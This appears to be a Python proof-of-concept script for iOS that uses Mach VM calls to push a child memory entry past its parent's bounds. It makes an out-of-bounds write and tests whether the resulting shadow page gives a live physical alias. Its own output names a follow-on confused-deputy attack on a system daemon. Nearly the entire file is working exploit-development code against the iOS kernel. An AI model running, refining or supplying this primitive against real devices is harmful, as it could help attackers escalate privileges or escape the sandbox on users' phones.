"""
TOCTOU confirmation test for Surface 4 shadow re-export.

Run in a-Shell on iOS 26.6.1.

Tests whether mach_make_memory_entry_64 on the OOB shadow page (q[0x3000])
produces a named entry that is a LIVE physical alias — i.e. mutations through
one VA are visible through the other VA after mapping via ne.

Expected output if TOCTOU is confirmed:
  ne = <nonzero>  ns = 0x4000
  b4[0] = 171                  (0xAB — ne maps the same shadow page)
  b4[0] after mutation = 205   (0xCD — live alias confirmed)
  TOCTOU CONFIRMED: live physical alias via ne

Expected output if COW breaks the alias:
  b4[0] = 171
  b4[0] after mutation = 171   (unchanged — COW gave ne its own copy)
  TOCTOU FAILED: COW broke the alias
"""

import ctypes as C

L = C.CDLL('/usr/lib/libSystem.B.dylib')

t = L.mach_task_self()

M = L.mach_make_memory_entry_64
M.restype  = C.c_int
M.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int,
              C.POINTER(C.c_uint32), C.c_uint32]

V = L.mach_vm_map
V.restype  = C.c_int
V.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64,
              C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]

A = L.mach_vm_allocate
A.restype  = C.c_int
A.argtypes = [C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]

# --- Step 1: allocate backing region, create parent entry ---
a = C.c_uint64(0)
kr = A(t, C.byref(a), 0x4000, 1)
assert kr == 0, f"mach_vm_allocate failed: {kr}"

p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
assert kr == 0 and p.value != 0, f"parent entry failed: kr={kr}"
print(f"parent entry: port={p.value}  size={hex(ps.value)}")

# --- Step 2: Surface 4 — child entry escapes parent by one page ---
c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
assert kr == 0, f"child entry failed: kr={kr}"
print(f"child entry:  port={c.value}  corrected_size={hex(cs.value)}")
# corrected_size should be 0x4000 (or at least >= 0x2000), escaping parent

# --- Step 3: map child entry, perform OOB write at offset 0x3000 ---
m = C.c_uint64(0)
kr = V(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
assert kr == 0, f"mach_vm_map (child) failed: kr={kr}"
q = (C.c_uint8 * 0x4000).from_address(m.value)
q[0x3000] = 0xAB   # OOB write — faults in shadow page past parent boundary
print(f"OOB write: q[0x3000] = 0xAB at VA {hex(m.value + 0x3000)}")

# --- Step 4: create named entry from the shadow page VA ---
ne = C.c_uint32(0); ns = C.c_uint64(0x4000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(ne), 0)
print(f"ne: kr={kr}  port={ne.value}  size={hex(ns.value)}")
if kr != 0 or ne.value == 0:
    print("BLOCKED: mach_make_memory_entry on shadow VA failed — shadow page not nameable")
    raise SystemExit(1)

# --- Step 5: map ne into a second VA and check initial value ---
m4 = C.c_uint64(0)
kr = V(t, C.byref(m4), 0x4000, 0, 1, ne.value, 0, 0, 3, 3, 0)
assert kr == 0, f"mach_vm_map (ne) failed: kr={kr}"
b4 = (C.c_uint8 * 0x4000).from_address(m4.value)
print(f"b4[0] via ne = {b4[0]}  (expect 171 = 0xAB)")

# --- Step 6: mutate through original mapping AFTER ne is mapped ---
q[0x3000] = 0xCD
print(f"b4[0] after q[0x3000]=0xCD: {b4[0]}")

if b4[0] == 0xCD:
    print("\nTOCTOU CONFIRMED: live physical alias via ne")
    print("Shadow page mutations are immediately visible through ne mappings.")
    print("Phantom aliasing is REAL — ne can be sent to a daemon for confused-deputy attack.")
elif b4[0] == 0xAB:
    print("\nTOCTOU FAILED: COW broke the alias")
    print("ne received a frozen copy of the page at creation time.")
    print("Mutations through q are NOT visible through b4.")
else:
    print(f"\nUNEXPECTED: b4[0] = {b4[0]}")
